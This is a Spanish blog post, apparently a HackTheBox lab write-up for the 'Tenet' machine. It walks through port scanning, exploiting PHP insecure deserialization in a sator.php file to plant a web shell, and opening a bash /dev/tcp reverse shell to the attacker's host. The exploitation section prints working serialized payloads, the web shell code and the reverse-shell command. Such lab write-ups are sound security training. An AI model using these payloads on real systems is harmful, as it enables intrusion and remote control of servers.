<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/lanz2.png">

<title>HackTheBox - Tenet</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Tenet | Sh0x blog</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackTheBox - Tenet" />
<meta name="author" content="lanz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="M√°quina Linux nivel medio. Exploraremos deserializaci√≥n insegura de objetos en PHP, reutilizaci√≥n de contrase√±as y encontraremos peque√±os fallos en scripts de bash :P" />
<meta property="og:description" content="M√°quina Linux nivel medio. Exploraremos deserializaci√≥n insegura de objetos en PHP, reutilizaci√≥n de contrase√±as y encontraremos peque√±os fallos en scripts de bash :P" />
<link rel="canonical" href="http://localhost:4000/htb/tenet" />
<meta property="og:url" content="http://localhost:4000/htb/tenet" />
<meta property="og:site_name" content="Sh0x blog" />
<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-06-12T00:00:00-07:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" />
<meta property="twitter:title" content="HackTheBox - Tenet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-12T00:00:00-07:00","datePublished":"2021-06-12T00:00:00-07:00","description":"M√°quina Linux nivel medio. Exploraremos deserializaci√≥n insegura de objetos en PHP, reutilizaci√≥n de contrase√±as y encontraremos peque√±os fallos en scripts de bash :P","headline":"HackTheBox - Tenet","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/tenet"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/tenet"}</script>
<!-- End Jekyll SEO tag -->

    
<link href="/assets/css/prism.css" rel="stylesheet">

<link href="/assets/css/theme.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>


<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h3>El tiempo a destiempo</h3>
        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
        <li><a href="/categories#article">Art√≠culos</a></li>
        <li><a href="/categories#htb">HackTheBox</a></li>
        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
    </ul>   
</nav>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>


<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">HackTheBox - Tenet</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
            
        </div>            
        <div>
        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
        <span class="post-date"><time class="post-date" datetime="2021-06-12">12 Jun 2021</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" alt="HackTheBox - Tenet">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    <!-- End Toc -->
    <p>M√°quina <strong>Linux</strong> nivel medio. Exploraremos deserializaci√≥n insegura de objetos en <strong>PHP</strong>, reutilizaci√≥n de contrase√±as y encontraremos peque√±os fallos en scripts de <strong>bash</strong> :P</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309tenetHTB.png" alt="309tenetHTB" /></p>

<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>

<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/94858">egotisticalSW</a>.</p>

<p>Bueno bueno bu e nooo ooo ¬øC√≥mo est√°s?</p>

<p>Nos encontraremos con una p√°gina web montada sobre <code>wordpress</code>, daremos algunas vueltas y despues de estar perdidos (como raro :P) encontramos dos archivos interesantes: <code>sator.php</code> y <code>sator.php.bak</code>. Nos aprovecharemos que podemos ver el c√≥digo fuente para entender que podemos explotar una vulnerabilidad llamada <strong>inyecci√≥n de objetos PHP</strong>. La usaremos para conseguir una sesi√≥n como <code>www-data</code>.</p>

<ul>
  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/tenet/RCE_deserialization.py">Script para ejecutar cualquier comando en la m√°quina mediante la deserializaci√≥n insegura</a>.</li>
</ul>

<p>Enumerando tendremos unas credenciales del usuario <code>neil</code> hacia la base de datos <code>mysql</code>, con las mismas credenciales lograremos obtener una sesi√≥n como el usuario <code>neil</code>.</p>

<p>Tambi√©n enumerando (en la anterior tambi√©n nos percat√°bamos de esto) encontramos un script que puede ser ejecutado como usuario administrador. Observando su fuente notaremos que podemos manipular el proceso, incluiremos nuestra llave p√∫blica al archivo <code>authorized_keys</code> del usuario <code>root</code>. Con esto conseguiremos una sesi√≥n como el usuario <code>root</code>.</p>

<h4 id="clasificaci√≥n-de-la-m√°quina">Clasificaci√≥n de la m√°quina</h4>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>

<p>Tendremos que movernos bastante, lo cual est√° perfecto :) Pero la m√°quina es muy poco realista :(</p>

<blockquote>
  <p>Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto).</p>
</blockquote>

<p>‚Ä¶</p>

<p>¬øQu√© haremos?</p>

<ol>
  <li><a href="#enumeracion">Enumeraci√≥n</a></li>
  <li><a href="#explotacion">Explotaci√≥n</a></li>
  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
</ol>

<p>‚Ä¶</p>

<h2 id="enumeracion">Enumeraci√≥n <a href="#enumeracion">#</a></h2>

<p>Realizaremos un escaneo de puertos para saber que servicios est√° corriendo la m√°quina.</p>

<pre><code class="language-bash">‚Äì¬ª nmap -p- --open -v 10.10.10.223 -oG initScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Par√°metro</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td style="text-align: left">Escanea todos los 65535</td>
    </tr>
    <tr>
      <td>‚Äìopen</td>
      <td style="text-align: left">Solo los puertos que est√°n abiertos</td>
    </tr>
    <tr>
      <td>-v</td>
      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">funci√≥n</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">‚Äì¬ª cat initScan 
# Nmap 7.80 scan initiated Sun Jan 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.223
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.223 ()   Status: Up
Host: 10.10.10.223 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sun Jan 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 86.68 seconds
</code></pre>

<p>Perfecto, tenemos:</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>22</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Conexi√≥n remota segura mediante una Shell</td>
    </tr>
    <tr>
      <td>80</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Protocolo que permite la comunicaci√≥n y transferencia de info a trav√©s de la web</td>
    </tr>
  </tbody>
</table>

<p>Hagamos nuestro escaneo de scripts y versiones con base en cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio:</p>

<pre><code class="language-bash">‚Äì¬ª nmap -p 22,80 -sC -sV 10.10.10.223 -oN portScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Par√°metro</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p</td>
      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
    </tr>
    <tr>
      <td>-sC</td>
      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
    </tr>
    <tr>
      <td>-sV</td>
      <td style="text-align: left">Nos permite ver la versi√≥n del servicio</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td style="text-align: left">Guarda el output en un archivo</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">‚Äì¬ª cat portScan 
# Nmap 7.80 scan initiated Sun Jan 17 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 14.20 seconds
</code></pre>

<p>Obtenemos:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Puerto</th>
      <th style="text-align: left">Servicio</th>
      <th style="text-align: left">Versi√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">22</td>
      <td style="text-align: left">SSH</td>
      <td style="text-align: left">OpenSSH 7.6p1 Ubuntu 4</td>
    </tr>
    <tr>
      <td style="text-align: left">80</td>
      <td style="text-align: left">HTTP</td>
      <td style="text-align: left">Apache httpd 2.4.29</td>
    </tr>
  </tbody>
</table>

<p>Pues d√©mosle a cada servicio y veamos que podemos romper (:</p>

<p>‚Ä¶</p>

<p>En cuanto al puerto <strong>22</strong> y su versi√≥n <code>OpenSSH 7.6</code>, lo √∫nico que podemos hacer es enumeraci√≥n de usuarios en concreto, pero por el momento no tenemos ninguno, as√≠ que sigamos‚Ä¶</p>

<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">‚åñ</a></h3>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80.png" alt="309page80" /></p>

<p>Nos muestra la p√°gina por defecto de Apache‚Ä¶ Us√©mosla para hacer algo de fuzzing, en este caso antes de usar <code>dirsearch</code> o <code>wfuzz</code>, emplear√© un script de <code>nmap</code> que nos dar√° una visi√≥n r√°pida por si hay algo interesante:</p>

<pre><code class="language-bash">‚Äì¬ª nmap -p 80 --script http-enum 10.10.10.223 -oN webScan
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 25:25 -25
Nmap scan report for 10.10.10.223
Host is up (0.19s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.

Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds
</code></pre>

<p>Opa, tenemos una ruta, veamos su contenido:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_wplogin.png" alt="309page80_wplogin" /></p>

<p>Algo feito‚Ä¶ Lo interesante es que nos permite ir de vuelta a <code>tenet</code>, que si revisamos hac√≠a que URL nos lleva:</p>

<pre><code class="language-html">...
&lt;p id="backtoblog"&gt;&lt;a href="http://tenet.htb/"&gt;
&amp;larr; Go to Tenet&lt;/a&gt;&lt;/p&gt;
...
</code></pre>

<p>Agregu√©mosla al archivo <code>/etc/hosts</code> y validemos <code>http://tenet.htb</code>.</p>

<pre><code class="language-bash">‚Äì¬ª cat /etc/hosts
...
10.10.10.223  tenet.htb
...
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_tenetHTB.png" alt="309page80_tenetHTB" /></p>

<p>Tenemos 3 art√≠culos, uno sobre la b√∫squeda de nuevos talentos :P, otro sobre una migraci√≥n de informaci√≥n que est√°n haciendo y otro sobre un nuevo release, revisando cada uno, el de la migraci√≥n tiene algo interesante:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_tenetHTB_migration.png" alt="309page80_tenetHTB_migration" /></p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_tenetHTB_mig_comment.png" alt="309page80_tenetHTB_mig_comment" /></p>

<p>Habla sobre un <strong><em>sator php file</em></strong>, una b√∫squeda r√°pida me direcciono:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309google_satorPHPfile.png" alt="309google_satorPHPfile" /></p>

<p>Hay dos se√±ales de que por ac√° debe ser el camino, <code>Tenet</code> est√° grabado en los cuadros y el logo de la m√°quina es el mismo que el cuadro, as√≠ que s√≠, debe ser por ac√°‚Ä¶ Muy real no es pero est√° divertido :P</p>

<blockquote>
  <p><strong>Cuadrado Sator</strong>: Cuadrado m√°gico compuesto por cinco palabras latinas: SATOR, AREPO, TENET, OPERA, ROTAS, que, consideradas en conjunto, dan lugar a un multipal√≠ndromo (Frases que se leen igual desde el lado izquierdo al derecho que en sentido contrario). <a href="https://es.wikipedia.org/wiki/Cuadrado_sator">Wikipedia</a>‚Ä¶ <strong>Me parecio interesante</strong>, sigamos.</p>
</blockquote>

<p>‚Ä¶</p>

<p>As√≠ que entiendo que debemos encontrar el archivo <code>sator.php</code> (?), o quiz√°s su backup <code>sator.php.bak</code> (?). Estoy adivinando a que puedan ser esos nombres, pero no lo podemos saber hasta encontrarlos, no?</p>

<p><strong>Llevo bastante rato perdido, no encuentro nadaaaaaaaaaaaaaa.</strong> (Si, hablando en presente :P)</p>

<p>Tuve que pedir ayuda al que nunca falla, <a href="https://www.hackthebox.eu/profile/49335">@TazWake</a> y ay noooo, era lo m√°s sencillo del mundo, pero pues estaba tan cerrado en encontrarlo que no lo pens√©.</p>

<p>Si revisamos la IP del dominio <code>tenet.htb</code>, o sea la <code>10.10.10.223</code> y buscamos ah√≠ los archivos‚Ä¶ Pues si, sencillamente los encontramos üòÄ üôÉ üòê üòî</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_satorPHP.png" alt="309page80_satorPHP" /></p>

<p>Y si apuntamos al backup (<code>sator.php.bak</code>), nos permite descargar el archivo‚Ä¶</p>

<pre><code class="language-php">&lt;?php

class DatabaseExport
{
  public $user_file = 'users.txt';
  public $data = '';

  public function update_db()
  {
    echo '[+] Grabbing users from text file &lt;br&gt;';
    $this-&gt; data = 'Success';
  }

  public function __destruct()
  {
    file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
    echo '[] Database updated &lt;br&gt;';
    echo 'Gotta get this working properly...';
  }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -&gt; update_db();

?&gt;
</code></pre>

<p>Algo que me llamo la atenci√≥n de inmediato fue la funci√≥n <code>unserialize</code>, puesto que he experimentado con vulnerabilidades al serializar o deserializar un objeto. As√≠ que despues de buscar por internet de que se trataba y si era peligroso su uso, tenemos varias cositas interesantes:</p>

<p>‚Ä¶</p>

<h2 id="explotacion">Explotaci√≥n <a href="#explotacion">#</a></h2>

<p><strong>Se viene mucho texto :)</strong></p>

<p>‚Ä¶</p>

<ul>
  <li><strong>Excelente articulo:</strong> Exploiting PHP deserialization - <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">medium.com/(vickie li)</a>.</li>
</ul>

<p>‚Ä¶</p>

<h3 id="explicando-concepto-de-deserializaci√≥n">Explicando concepto de deserializaci√≥n</h3>

<p>En pocas palabras (pocas realmente, √©chenle un ojo por su parte, es super interesante). La <a href="https://www.glosarioit.com/Deserializaci%C3%B3n">deserializaci√≥n</a> es pasar un conjunto de bytes que viaja por la red a un √∫nico objeto. (La serializaci√≥n ser√≠a lo contrario).</p>

<p>El problema de esto es que mientras se efect√∫a la conversi√≥n/transformaci√≥n, siempre depende de la sanitizaci√≥n con la que se cuente, se pueden inyectar comandos que si o si, se ejecutar√°n en el proceso, donde si llegase a fallar por X o Y motivo, no nos importar√≠a, ya que el intento de serializaci√≥n/deserializaci√≥n se hizo, por lo tanto tambi√©n nuestro exploit.</p>

<p>Algo m√°s de info:</p>

<ul>
  <li>Deserializaci√≥n insegura - <a href="https://seguridad-ofensiva.com/blog/owasp-top-10/owasp-top-8/">seguridad-ofensiva.com/OWASP-Top-10</a>.</li>
  <li>PHP Object Injection Cheat Sheet - <a href="https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/">nitesculucian.github.io</a>.</li>
  <li>Insecure Deserialization PHP - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md">github.com/PayloadsAllTheThings</a>.</li>
  <li>PHP object injection - <a href="https://www.tarlogic.com/blog/php-object-injection/">tarlogin.com</a>.</li>
</ul>

<p>En nuestro caso tratamos con una deserializaci√≥n en PHP, enfoqu√©monos en el c√≥digo del archivo <code>sator.php</code>:</p>

<p><span style="color: yellow;">1. </span>Recibe las peticiones <code>GET</code> mediante el argumento <code>arepo</code> y lo guarda en la variable <code>input</code> para posteriormente hacer la respectiva <code>deserializacion</code> de ella (viene lo lindo).</p>

<p><span style="color: yellow;">2. </span>Guarda la deserializaci√≥n en otra variable y no hace nada con ella. Ahora genera un nuevo objeto para simplemente imprimir <code>[+] Grabbing users from text file</code> en la web. (Lo vimos en la imagen anterior)</p>

<p><span style="color: yellow;">3. </span>Lo ¬´lindo¬ª es que en todos los art√≠culos que hablan sobre <code>PHP serialize/unserialize object injection</code> tocan dos √≠tems necesarios para poder aprovecharnos del proceso:</p>
<ul>
  <li>Ac√° tocan que obviamente tengamos la manera de manipular la data que se va a deserializar. En nuestro caso tenemos el argumento <code>arepo</code>, as√≠ que bien.</li>
  <li>El uso de un <a href="https://www.php.net/manual/en/language.oop5.magic.php">m√©todo m√°gico</a> (B√°sicamente m√©todos para llevar a cabo ciertas tareas, <a href="https://www.tutorialspoint.com/php-magic-methods">mucha m√°s info ac√°</a>).
    <ul>
      <li>Nosotros tenemos el m√©todo <code>__destruct()</code> que borra cualquier referencia en base al objeto creado.</li>
    </ul>
  </li>
  <li>Donde siempre que se llame a la funci√≥n <code>unserialize</code> se llamara tambi√©n al m√©todo. (Por eso tambi√©n ve√≠amos en la imagen el texto <code>[] Database updated</code>, no s√© por qu√© el otro texto no se muestra, pero bueno, se entiendo el punto.</li>
</ul>

<p><span style="color: yellow;">4. </span>Finalmente toma el contenido de la variable <code>user_file</code> (en este caso <code>users.txt</code>) y le guarda el contenido ahora de la variable <code>data</code> (en este caso <code>''</code> (vac√≠o por si no se entiende :P)). Todo mediante la funci√≥n <a href="https://www.php.net/manual/es/function.file-put-contents.php">file_put_contents</a>.</p>

<p>Eso es lo que hace el archivo, pero ¬øc√≥mo podemos finalmente aprovecharnos de esto? Bueno despues de algo de prueba y error y de encontrar este art√≠culo, realmente entend√≠ la explotaci√≥n:</p>

<p>Pero antes, una aclaraci√≥n :P el articulo simplemente me ayudo a obtener un output (que ni supuse me iba a dar) con el que estaba lidiando en mi cabeza antes de encontrarlo:</p>

<ul>
  <li>PHP unserialize object injection .. wordpress - <a href="https://dannewitz.ninja/posts/php-unserialize-object-injection-yet-another-stars-rating-wordpress">dannewitz.ninja</a></li>
</ul>

<p>El articulo cita este trozo de codigo, el cual me parecio interesante:</p>

<blockquote>
  <pre><code class="language-php">$logger = new Logger('exploit.php', '&lt;?php exec($_GET["paul"]) ?&gt;');
echo htmlspecialchars(urlencode(serialize($logger)));
</code></pre>
</blockquote>

<p>Que planeaba usar para que me generara un archivo (exploit.php) obteniendo el objeto <strong>serializado</strong> para enviarlo mediante una petici√≥n <code>GET</code>. Asi que lo agregue al objeto <code>sator.php.bak</code> y lo ejecute:</p>

<pre><code class="language-php">...
$app -&gt; update_db();

echo "------";
$logger = new DatabaseExport('expl.php', '&lt;?php exec($_GET["paul"]) ?&gt;');
echo htmlspecialchars(urlencode(serialize($logger)));
echo "------";

?&gt;
</code></pre>

<pre><code class="language-bash">‚Äì¬ª php sator.php.bak
[+] Grabbing users from text file &lt;br&gt;------O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22users.txt%22%3Bs%3A4%3A%22data%22%3Bs%3A0%3A%22%22%3B%7D------[] Database updated &lt;br&gt;Gotta get this working properly...[] Database updated &lt;br&gt;Gotta get this working properly...
</code></pre>

<p>Nos genera la cadena en formato URL encode. Hagamos un <strong>Decode</strong>:</p>

<pre><code class="language-json">O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:0:"";}
</code></pre>

<p>Asi es como viaja la data del objeto serializado, hay mas items pero en la cadena que tenemos nosotros contamos con: (Vuelvo a citar el gran <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">articulo de Vickie Li</a>).</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Argumento</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">O</td>
      <td style="text-align: left">Representa un <code>objeto</code> llamado <code>DatabaseExport</code> (la longitud de la cadena es <code>14</code>) y que tiene <code>2</code> propiedades, la primera propiedad:</td>
    </tr>
    <tr>
      <td style="text-align: left">s</td>
      <td style="text-align: left">Representa una <code>string</code> de <code>9</code> caracteres llamada <code>user_file</code></td>
    </tr>
    <tr>
      <td style="text-align: left">s</td>
      <td style="text-align: left">Representa una <code>string</code> de <code>9</code> caracteres llamada <code>users.txt</code> y la segunda propiedad:</td>
    </tr>
    <tr>
      <td style="text-align: left">s</td>
      <td style="text-align: left">Representa una <code>string</code> de <code>4</code> caracteres llamada <code>data</code></td>
    </tr>
    <tr>
      <td style="text-align: left">s</td>
      <td style="text-align: left">Representa una <code>string</code> de <code>0</code> caracteres llamada ``</td>
    </tr>
  </tbody>
</table>

<p>Perfecto, esto de una me hizo pensar en el archivo <code>users.txt</code> y que probablemente este creado en la raiz de la web, conteniendo <code>Success</code> (como nos lo indica el codigo de <code>sator.php.bak</code>).</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_usersTXT.png" alt="309page80_usersTXT" /></p>

<p>Opa, jmmm interesante. Despues de pensar y probar algunas cosas me llego una idea‚Ä¶ Yo no podria modificar el contenido del archivo <code>users.txt</code>? Pues probemos, para esto us√© <code>BurpSuite</code>:</p>

<pre><code class="language-json">/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:6:"holaa?";}
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309burp_tryingDATAchange.png" alt="309burp_tryingDATAchange" /></p>

<p>Damos <code>Send</code> y ahora revisamos el archivo <code>users.txt</code>:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_usersTXTupdated.png" alt="309page80_usersTXTupdated" /></p>

<p>Nice, nice, niceeeeeeeeeeeeeeeeeeee. Pero con un archivo <code>.txt</code>, que podemos explotar‚Ä¶ Jmmmm, entonces tambi√©n pens√© en si se podr√≠a crear un archivo que no fuera <code>users.txt</code> (?) Ve√°moslo:</p>

<pre><code class="language-json">/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:23:"&lt;?php echo 'holaa?'; ?&gt;";}
</code></pre>

<p>Encode URL:</p>

<pre><code class="language-json">/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:23:"%3C%3Fphp%20echo%20%27holaa%3F%27%3B%20%3F%3E";}
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_ajaTE_hola.png" alt="309page80_ajaTE_hola" /></p>

<p>Bingo PAAAAAAAAAAAA, ahora probemos a insertar algo que nos permita ejecutar comandos en el sistema:</p>

<pre><code class="language-json">/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:58:"&lt;?php $command=shell_exec($_GET['xmd']); echo $command; ?&gt;";}
</code></pre>
<p>Encode URL:</p>

<pre><code class="language-json">/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:58:"%3C%3Fphp%20%24command%3Dshell_exec%28%24_GET%5B%27xmd%27%5D%29%3B%20echo%20%24command%3B%20%3F%3E";}
</code></pre>

<p>Comprobemos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_ajaTE_getEXEC.png" alt="309page80_ajaTE_getEXEC" /></p>

<p>Listos, tenemos ejecuci√≥n remota de comandos en el sistema. Intentemos entablar una reverse Shell, primero nos ponemos en escucha:</p>

<pre><code class="language-bash">‚Äì¬ª nc -lvp 4433
listening on [any] 4433 ...
</code></pre>

<p>Ahora hacemos la petici√≥n:</p>

<pre><code class="language-html">/ajaTEncontre.php?xml=bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.226/4433 0&gt;&amp;1"
</code></pre>

<p>URL Encode:</p>

<pre><code class="language-html">/ajaTEncontre.php?xml=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.226%2F4433%200%3E%261%22
</code></pre>

<p>Yyy obtenemos nuestra Shell:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_ajaTE_revSH.png" alt="309page80_ajaTE_revSH" /></p>

<p>PERFECTOOOOOOOOOOO, que vaina linda ehh!! ‚õ∑Ô∏è</p>

<p>‚Ä¶</p>

<ul>
  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/tenet/RCE_deserialization.py">Script para ejecutar cualquier comando en la m√°quina mediante la deserializaci√≥n insegura</a>.</li>
</ul>

<p>‚Ä¶</p>

<p>Bueno, hagamos tratamiento de la TTY y sigamos‚Ä¶</p>

<ul>
  <li>S4vitar nos explica lo que debemos hacer para conseguir una <a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">Shell completamente interactiva (tratamiento de la TTY)</a>.</li>
</ul>

<p>‚Ä¶</p>

<p>Tenemos solo un usuario y es el que contiene la bandera del <code>user.txt</code>:</p>

<pre><code class="language-bash">www-data@tenet:/var/www/html$ ls /home/
neil
www-data@tenet:/var/www/html$ ls /home/neil/
user.txt
www-data@tenet:/var/www/html$ cat /home/neil/user.txt 
cat: /home/neil/user.txt: Permission denied
www-data@tenet:/var/www/html$
</code></pre>

